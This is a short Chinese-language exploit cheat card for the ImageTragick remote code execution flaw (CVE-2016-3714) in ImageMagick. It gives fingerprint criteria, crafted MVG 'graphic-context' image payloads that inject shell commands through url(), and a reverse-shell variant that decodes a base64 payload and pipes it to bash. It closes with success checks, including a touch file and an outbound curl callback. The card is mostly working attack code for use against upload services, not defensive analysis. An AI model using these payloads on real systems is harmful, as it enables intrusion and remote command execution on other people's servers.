# ImageMagick Imagetragick RCE (CVE-2016-3714)

## 指纹特征
- 服务: 使用 ImageMagick 进行图片处理的应用
- 版本: < 6.9.3-9
- 场景: 上传功能调用 ImageMagick `convert`, `identify` 等命令。

## 利用矩阵
| 触发方式 | 依赖条件 |
| :--- | :--- |
| 图片元数据注入 (MVG 格式) | 服务端调用 ImageMagick 处理用户上传文件 |

## PoC 指令

构造包含恶意 `graphic-context` 数据的图片文件（例如以 `.png` 后缀上传）：

```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/oops.jpg"|{{COMMAND}})'
pop graphic-context
```

**示例 (反弹 Shell)**:
```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/oops.jpg?`{{BASE64_PAYLOAD}} | base64 -d | bash`"||id ")'
pop graphic-context
```

## Success Signal
- **状态验证**: 执行 `touch /tmp/success` 后验证文件是否存在。
- **回显验证**: 命令在后端执行成功（如通过 `curl` 外连测试）。
| 关键语法 | 说明 |
| :--- | :--- |
| `url(...)` | 利用 `url` 包装特性调用外部协议/命令 |
| `|` | 管道操作符，触发 `curl` 或 Shell 命令执行 |
